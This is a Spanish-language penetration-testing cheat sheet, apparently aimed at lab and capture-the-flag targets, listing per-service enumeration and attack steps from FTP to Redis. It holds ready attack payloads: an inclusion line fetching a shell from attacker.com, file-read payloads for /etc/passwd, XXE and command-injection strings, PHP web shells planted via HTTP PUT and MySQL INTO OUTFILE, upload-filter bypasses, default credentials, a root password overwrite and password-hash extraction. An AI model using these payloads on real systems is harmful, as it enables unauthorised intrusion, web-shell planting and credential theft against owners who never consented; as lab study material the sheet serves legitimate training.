## Mapeo de la Red

- Identificación de Hosts Activos
- Escaneo de Puertos
- Escaneo de Servicios
- Escaneo de Versiones
- Escaneo con NSE/Scripts
- Escaneo de SO
- Escaneo UDP y TCP

---

## FTP (Puerto 21)

- Obtención de Banner para Versiones
- Acceso Anónimo
- Bounce FTP
- Contraseñas por defecto

---

## SSH (Puerto 22)

- Obtención de Banner para Versiones
- Contraseña Nula
- Contraseñas por defecto

---

## SMTP (Puerto 25)

- Obtención de Banner para Versiones
- Conexión con Telnet
- SMTP Relay
- Enumeración de Usuarios

---

## DNS (Puerto 53)

- Fuerza bruta de Hostnames DNS
- Búsqueda inversa DNS
- Enumeración de Registros de Servicio DNS
- Descubrimiento de Zona DNS

---

## HTTP / HTTPS (Puerto 80, 443, 8080, 8443)

### Enumeración Inicial

- Navegar manualmente al sitio (`http://IP` y `https://IP`)
- Revisar código fuente (`Ctrl+U`) en busca de comentarios, rutas y credenciales
- Identificar CMS/tecnologías con whatweb o Wappalyzer:

```bash
whatweb http://IP
whatweb -a 3 http://IP       # nivel agresivo
```

- Obtener headers HTTP:

```bash
curl -I http://IP
curl -s -D - http://IP -o /dev/null
```

### Directory & File Busting

```bash
# gobuster
gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,bak,zip,tar,gz -t 50

# ffuf (más rápido)
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .php,.txt,.html,.bak

# Feroxbuster (recursivo, rápido)
feroxbuster -u http://IP -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html

# Dirb (simple)
dirb http://IP /usr/share/seclists/Discovery/Web-Content/common.txt
```

### Archivos y Rutas Prioritarias

```
/robots.txt
/sitemap.xml
/.git/HEAD
/.env
/.htaccess
/backup/
/admin/
/wp-admin/
/phpinfo.php
/console/
/server-status
/.DS_Store
/README.md
/CHANGELOG.txt
/composer.json
/package.json
```

### Virtual Host Enumeration (vhost)

```bash
gobuster vhost -u http://IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

ffuf -u http://IP -H "Host: FUZZ.target.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw <size>
```

### Fingerprinting de CMS

| CMS | Scanner |
| :-- | :------ |
| **WordPress** | `wpscan --url http://IP` |
| **Joomla** | `joomscan -u http://IP` |
| **Drupal** | `droopescan scan drupal -u http://IP` |
| **Magento** | `magescan http://IP` |

### Vulnerabilidades Web Comunes

**SQL Injection:**
- Probar parámetros con `'`, `"`, `OR 1=1--`
- Usar sqlmap: `sqlmap -u "http://IP/page.php?id=1" --batch --dbs`

**XSS (Cross-Site Scripting):**
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`

**LFI (Local File Inclusion):**
- `/?page=../../../etc/passwd`
- `/?page=php://filter/convert.base64-encode/resource=index`

**RFI (Remote File Inclusion):**
- `/?page=http://attacker.com/shell.txt`

**XXE (XML External Entity):**
- Subir XML malicioso con entidad externa:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**SSTI (Server-Side Template Injection):**
- `{{7*7}}`, `${7*7}`, `#{7*7}`

**SSRF (Server-Side Request Forgery):**
- `/?url=http://127.0.0.1:8080/admin`
- `/?url=file:///etc/passwd`

**Command Injection:**
- `; id`, `| id`, `|| id`, `&& id`
- `` `id` ``, `$(id)`

**File Upload:**
- Bypass de extensión: `.php.jpg`, `.php%00.jpg`, `.pht`, `.phtml`, `.phar`
- Magic bytes: añadir `GIF89a;` o `<?php` al inicio
- Webshells: [pentestmonkey php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

**IDOR (Insecure Direct Object Reference):**
- Modificar IDs en parámetros: `/user?id=1` → `/user?id=2`

### Métodos HTTP

```bash
# Probar métodos disponibles
nmap --script http-methods -p80,443 IP
curl -X OPTIONS http://IP -v

# PUT method exploitation (si está habilitado)
curl -X PUT -d "<?php system($_GET['cmd']); ?>" http://IP/shell.php
```

### CGI / Scripts Explotables

```bash
nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi -p80 IP
nmap --script http-cgi-shock -p80 IP
```

### Credenciales por Defecto

- `admin:admin`
- `admin:password`
- `admin:password123`
- `guest:guest`
- `user:user`
- Buscar en [Default Credentials](https://github.com/ihebski/DefaultCreds-cheat-sheet)

### Herramientas Rápidas

```bash
# Nikto — scan completo de vulnerabilidades web
nikto -h http://IP

# OWASP ZAP — proxy de interceptación + escaneo automatizado (GUI + API)
# Burp Suite — proxy manual para testing (GUI)
```

---

## Jenkins

- Páginas accesibles sin autenticación como:
  - `/people`
  - `/asynchPeople`
  - `/securityRealm/user/admin/search/index?q=`
- Versiones Vulnerables
- Explotación: [pwn_jenkins](https://github.com/gquere/pwn_jenkins)

---

## IIS

- Enumeración de archivos `.config` en IIS
- Habilitación de `Trace.AXD` para debugging
- Path Traversal
- Divulgación de Código Fuente
- Descarga de DLLs:
  - `System.Web.Routing.dll`
  - `System.Web.Optimization.dll`
  - `System.Web.Mvc.dll`
  - `System.Web.Mvc.Ajax.dll`
  - `System.Web.Mvc.Html.dll`
- Intento de Bypass de Autenticación Básica en IIS 7.5 al intentar acceder a:
  - `/admin:$i30$INDEX_ALLOCATION/admin.php`
  - `/admin::$INDEX_ALLOCATION/admin.php`
- Obtener el Banner de la Versión
- Realizar un Ataque de Fuerza Bruta en Directorios

---

## Kerberos (Puerto 88)

- Ataques al Directorio Activo (no cubierto aquí)
- Enumeración de Nombres de Usuario mediante fuerza bruta con Nmap:
  - `krb5-enum-users.nse`

---

## RPC (Puerto 111)

- Enumeración de Información Básica utilizando `rpcinfo`
- Conexión a RPC con el Cliente RPC

---

## LDAP (Puerto 389)

### Listar información pública

```bash
nmap -n -sV --script "ldap* and not brute" IP
```

### Verificar Credenciales Nulas

```bash
ldapsearch -x -h IP -D '' -w '' -b "DC=1_SUBDOMAIN,DC=TDL"
```

### Extraer Usuarios

```bash
ldapsearch -x -h IP -D 'DOMAIN\<username>' -w '<password>' -b "CN=Users,DC=1_SUBDOMAIN,DC=TDL"
```

### Extraer Equipos

```bash
ldapsearch -x -h IP -D 'DOMAIN\<username>' -w '<password>' -b "CN=Computers,DC=1_SUBDOMAIN,DC=TDL"
```

### Extraer mi información

```bash
ldapsearch -x -h IP -D 'DOMAIN\<username>' -w '<password>' -b "CN=MY NAME,CN=Users,DC=1_SUBDOMAIN,DC=TDL"
```

### Extraer Administradores de Dominio

```bash
ldapsearch -x -h IP -D 'DOMAIN\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=1_SUBDOMAIN,DC=TDL"
```

### Extraer Administradores de Empresa

```bash
ldapsearch -x -h IP -D 'DOMAIN\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=1_SUBDOMAIN,DC=TDL"
```

### Extraer Administradores

```bash
ldapsearch -x -h IP -D 'DOMAIN\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=1_SUBDOMAIN,DC=TDL"
```

### Extraer Grupos de Escritorio Remoto

```bash
ldapsearch -x -h IP -D 'DOMAIN\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=1_SUBDOMAIN,DC=TDL"
```

### Interfaz gráfica

- [jxplorer](http://jxplorer.org/)

---

## SMB (Puerto 445)

- Obtener Credenciales Anónimas
- Obtener Banner para Versiones

### Explotación de Sesiones Nulas con RPCClient

| Comando | Descripción |
| :------ | :---------- |
| `enumdomusers` | Listar usuarios |
| `queryuser <0xrid>` | Detalles del usuario |
| `queryusergroups <0xrid>` | Grupos del usuario |
| `lookupnames <username>` | Obtener SID de un usuario |
| `queryuseraliases [builtin\|domain] <sid>` | Alias de usuarios |
| `enumdomgroups` | Listar grupos |
| `querygroup <0xrid>` | Detalles de un grupo |
| `querygroupmem <0xrid>` | Miembros de un grupo |
| `enumalsgroups <builtin\|domain>` | Listar alias |
| `queryaliasmem <builtin\|domain> <0xrid>` | Miembros de alias |
| `enumdomains` | Listar dominios |
| `querydominfo` | Información del dominio |
| `lookupnames <username>` | Buscar SIDs por nombre |
| `lsaenumsid` | Buscar más SIDs |
| `lookupsids <sid>` | Ciclo de RID (verificar más SIDs) |

### Listar Comparticiones (Null Session)

```bash
smbclient -N -L //IP
```

### Listar Comparticiones con Credenciales

```bash
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //IP
```

### Montar Compartición sin Credenciales

```bash
mount -t cifs //x.x.x.x/share /mnt/share
```

### Montar Compartición con Credenciales

```bash
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```

### Ataque SMB Relay

---

## MySQL (Puerto 3306)

### Enumeración con nmap

```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-emptypassword,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012 IP
```

- Obtener Banner Básico

### Enumeración de Comandos Básicos

**Privilegios:**

```sql
SELECT grantee, table_schema, privilege_type FROM schema_privileges;
```

**Privilegios de Archivos:**

```sql
SELECT user, file_priv FROM mysql.user WHERE user='root';
```

**Usuario Actual:**

```sql
SELECT user();
```

### Escribir Archivo

```sql
SELECT 1,2,"<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

### Leer Archivo

```sql
SELECT load_file('/home/purabparihar/read_file.txt');
```

### Cambiar Contraseña de Usuario

```sql
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
```

### Extracción de Credenciales

```bash
mysql -u root --password=<PASSWORD> -e "SELECT User,Host,authentication_string FROM mysql.user;"
```

---

## PostgreSQL (Puerto 5432)

- Obtención de Banner
- Nombre de la Base de Datos
- Inyección de Flags

---

## VNC (Puerto 5900)

- **Acceso VNC sin autenticación**
- **Ubicación de Contraseña VNC** (la contraseña estará encriptada):
  - `~/.vnc/passwd`
- **Descifrado de Contraseña:**
  - `vncpwd.exe <contraseña encriptada>`

---

## Redis (Puerto 6379)

- Obtención de Banner
- Intentar acceder a Redis sin credenciales

### Enumeración después del inicio de sesión

**Extracción de información:**

```
INFO
```

**Extracción de Clientes Conectados:**

```
CLIENT LIST
```

**Extracción de Configuración:**

```
CONFIG GET *
```

**Volcado de la Base de Datos:**

> Redis usa **índices numéricos** (0-15 por defecto) para seleccionar bases de datos, no nombres.

```
SELECT 0
KEYS *
GET <clave>
```

---

## Escalada de Privilegios

- Identificar información del sistema:
  - Versión del kernel
  - Distribución
  - Usuario logueado
- Revisar permisos y accesos de archivos y directorios sensibles
- Identificar servicios, versiones y posibles vulnerabilidades conocidas
- Revisar configuraciones débiles o malas prácticas en servicios y aplicaciones
- Explotar vulnerabilidades descubiertas para obtener acceso de mayor privilegio
- Utilizar exploits conocidos o técnicas de escalada de privilegios como SUID, SGID, permisos de archivo, etc.